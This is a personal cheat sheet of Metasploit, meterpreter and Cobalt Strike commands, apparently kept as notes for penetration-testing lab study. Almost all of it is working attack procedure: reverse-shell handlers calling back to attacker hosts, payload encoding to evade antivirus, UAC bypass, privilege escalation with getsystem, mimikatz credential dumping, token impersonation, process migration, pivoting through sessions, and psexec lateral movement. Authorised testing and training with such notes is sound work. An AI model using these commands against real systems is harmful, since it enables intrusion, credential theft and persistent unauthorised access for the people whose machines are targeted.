# one-time-per-boot:
# start db service
$ sudo msfdb start 
# seed db schema
# sudo msfdb init

# launch console
$ sudo msfconsole -q
# `sudo` not required, but helps mask traffic via listening on tcp/80,tcp/443
# `-q` hide ascii startup banner


# create workspace
msf> help workspace
msf> workspace -a pentest
msf> workspace pentest

# launch nmap wrapper, storing result in db
msf> db_nmap -sS -sV -Pn -F -v 10.11.1.71

# list discovered services from db
msf> services
msf> services -p 80 -S open -R # pre-fills current module TARGET with IP list from db
msf> hosts
msf> creds


# get help
msf> search -h
# search only for aux ldap mods
msf> search ldap type:auxiliary  
# get help
msf> creds -h
# populate current mod options from database
msf> creds -r


# how to launch a listener in one command
$ msfconsole -q -x "use exploit/multi/handler; set RHOST 1.2.3.4; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.11.0.4; exploit"

# how to tell connecting meterpreter reverse shells to auto-migrate to new process on connect. ie. to preserve them outside short-lived processes
msf> set AutoRunScript post/windows/manage/migrate
msf> exploit



# meterpreter: signature reverse shell payload, deployable in many formats
# related tools: mimikatz, msfvenom, armitage, shellter

# more at: https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/

# ---
### Cobalt Strike trivia
# metasploit is largest collection of community-curated public exploits that are safe to use (ie. no backdoors in them)
# the author of Cobalt Strike also designed the first free metasploit gui, Armitage--with the goal of making metasploit collaborative.
# it is basically metasploit plus paid post-exploitation tools and report-generation features.
# podcast interview with author @armitagehacker https://soundcloud.com/securityorb/an-interview-with-armitage-and

# `beacon` is the signature payload provided by Cobalt Strike. it's a dropper with a network stager that can load modules and execute

$ psexec     Remote execute via Service Control Manager
         	   Use a service to run a Service EXE artifact
$ psexec64 	 Use a service to run a Service EXE artifact
$ psexec_psh Use a service to run a PowerShell one-liner
$ wmi 	     Remote execute via WMI (PowerShell)
$ winrm    	 Remote execute via WinRM (PowerShell)
$ winrm64  	 Run a PowerShell script via WinRM



# ---
## payloads
# `*/shell/*` = staged
# small binary, dropper connects back, xfter modules over net, less likely to be detected by AV since less written to disk
# `*/shell_*` = not staged

# meterpreter = payload supporting many features incl. file xfer, screenshot, webcam, mic, keylogging, etc.
# NOTICE: 32/64-bit arch of payload must match target host for all features to work!
msf> search meterpreter type:payload
msf> set payload windows/meterperter/reverse_http
msf> exploit

# upon reverse shell connection
meterpreter> help
# determine arch of victim and which shell arch you have
meterpreter> sysinfo
meterpreter> getuid
# NOTICE: must escape backslash due to shell 
meterpreter> upload ./a c:\\a
meterpreter> download c:\\a ./a
meterpreter> pwd
meterpreter> ls
meterpreter> cd
meterpreter> shell
# NOTICE: if shell hangs, can return to meterpreter with Ctrl-C
# launch an application
meterpreter> execute -f notepad
meterpreter> ps
meterpreter> kill 6812


# notable payloads:
# - mimikatz
# - reverse php
# - vnc windows
# - executable binaries (.exe, .jar, etc.)
# TIP: type load and hit <TAB> to see all modules via tab-completion


# multi-handler: meterpreter will listen reverse-shell connections, and manage them in background
# useful over `nc -lvp` and can sit and listen for future connections (ie. when user runs .exe or on machine reboot)
msf> use exploit/multi/handler
msf> set payload windows/meterpreter/reverse_https
msf> set LHOST 1.2.3.4
msf> set LPORT 443
msf> exploit
# NOTICE: `exploit` will block the metasploit command prompt until execution finishes
msf> exploit -j
# `-j` runs it as a background job
# list background jobs
msf> jobs
# list detail on a job
msf> jobs -i 0

# configure second stage of meterpreter payload (which is uploaded to victim when reverse shell first connects)
# may choose to encode it to further evade AV
msf> set EnableStageEncoding true
msf> set StageEncoder x86/shikata_ga_nai
# NOTICE: to undo these, use `unset` instead.
# tell meterpreter to always run certain commands on all new reverse shell conns
# this one lists all users
msf> set AutoRunScript windows/gather/enum_logged_on_users


# temporarily leave meterpreter shell to return to metasploit command prompt
meterpreter> background
# list backgrounded sessions
msf> sessions -l
# return to a session
msf> sessions -i 4

# you can switch the protocol used by the meterpreter reverse shell mid-session:
# show protocol options
meterpreter> transport list
# add support for a protocol to current meterpreter session
meterpreter> transport add -t reverse_tcp -l 10.11.0.4 -p 5666
# NOTICE: must begin listening as per "multi-handler" example above, before next line will connect
# switch current meterpreter to that protocol by creating a new session, then shutting down the old one
meterpreter> transport next


## migrating processes
# can pick a pid from `ps` output
meterpreter> migrate 5248
# NOTICE: target proc Privilege and Integrity level must be <= current

## bypassing UAC
# there are several modules, but here is one:
msf> use exploit/windows/local/bypassuac_injection_winsxs
msf> set SESSION 4
msf> exploit
# new meterpreter session will connect from elevated privilege proc
# NOTICE: this is just one example of how you can detonate msf modules remotely via an active meterpreter session

## powershell module
meterpreter> load powershell
meterpreter> help powershell
meterpreter> powershell_execute "$PSVersionTable.PSVersion"

## mimikatz module
# i think this is a lightweight version that may operate differently, have fewer cmds, etc.
# NOTICE: loading modules this way happens over network so it never writes to disk, evading AV
meterpreter> load kiwi
# load SYSTEM role from current Administrator+ process
meterpreter> getsystem
# dump creds to stdout
meterpreter> creds_msv

## incognito module
# impersonating a token requires the `SeImpersonatePrivilege` (since WinXP-SP2/WinSvr2k3/WinSvr2k-SP4)
# privileges `SeAssignPrimaryTokenPrivilege`, `SeCreateTokenPrivilege` can also be required.
# see https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
# Impersonate tokens = non-interactive scripts
#   allowed on the local system only
#   when the host is trusted for delegation, these can elevate to delegate tokens 
# Delegate tokens = interactive login prompt
#   allowed on any system; has cached authentication credentials
# tokens persist until reboot. even if a user logs off.
meterpreter> use incognito
# search for domain tokens of any logged-in user
meterpreter> list_tokens -u
meterpreter> impersonate_token sandbox\\Administrator
# see which user we are now
meterpreter> getuid
# get a shell
meterpreter> shell





## portscan module
# create a new msf-only route
msf> route add 192.168.1.0/24 2
# `2` the meterpreter session id to apply the route to
# list all msf-only routes
msf> route print
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 192.168.1.110
msf> set PORTS 445,3389
msf> run
# NOTICE: its running from localhost, but via the msf route, via the session
#         so we have effectively port-forwarded our portscan module (using only our meterpreter reverse shell; no ssh, and traffic disguised)

## psexec module
msf> use exploit/windows/smb/psexec
# NOTICE: when target = 0 Automatic it means there are multiple options; you should pick one
msf> show targets
msf> set target 1
msf> set SMBDomain corp
msf> set SMBUSer jeff_admin
msf> set SMBPass evil
msf> set payload windows/meterpreter/bind_tcp
# NOTICE: a reverse shell doesn't work here because the new target doens't have a route back to us
#         so we use the bind_tcp non-reverse shell, and initiate a new connection from our localhost to the target
#         which works via the msf `set route` we created earlier
msf> set RHOSTS 192.168.1.110
msf> set LHOST 4444
msf> exploit

## socks4a module
# enables local procs outside of msf to route through active msf routes/sessions
msf> use auxiliary/server/socks4a
msf> set SRVHOST 127.0.0.1
msf> exploit -j
# configure proxychains to use it
$ sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'
$ sudo proxychains rdesktop 192.168.1.110

## meterpreter port-forward
# creates port-fwd outside of msf to the routes/sessions inside active msf meterpreter sessions
# get help
meterpreter> portfwd -h
# fwd from the msf box localhost:3389 to remote target network 192.168.1.110:3389
meterpreter> portfwd add -l 3389 -p 3389 -r 192.168.1.110
# ie. from kali
$ rdesktop localhost






# ---
# Customizing MSF Modules
# these modules are all authored in Ruby.
# existing modules are located under:
$ cd /usr/share/metasploit-framework/modules/exploits/
$ ls
# if you want to create a module, you can do so in the root user's home dir
$ sudo mkdir -p /root/.msf4/modules/exploits/windows/http
$ sudo vim /root/.msf4/modules/exploits/windows/http/syncbreeze.rb




# ---
# Automating Metasploit w/ Resource Scripts
cat <<! > setup.rc
use exploit/multi/handler
...
exploit -j -z
!
# `-j -z` stops automatic tty interaction with new sessions; prevents hanging during scripting
sudo msfconsole -r setup.rc
# `-r` executes script


# NOTE: metasploit has a module for auto-detecting vulnerabilities by scanning from the victim machine like Qualys agent might
#       but i forgot what the name of it. i think it was a 2nd stage payload to meterpreter.



## useful settings

# ensure the meterpreter listener continues accepting new/re-connections
set ExitOnSession false

# automatically migrate to new process on connect
set AutoRunScript post/windows/manage/migrate

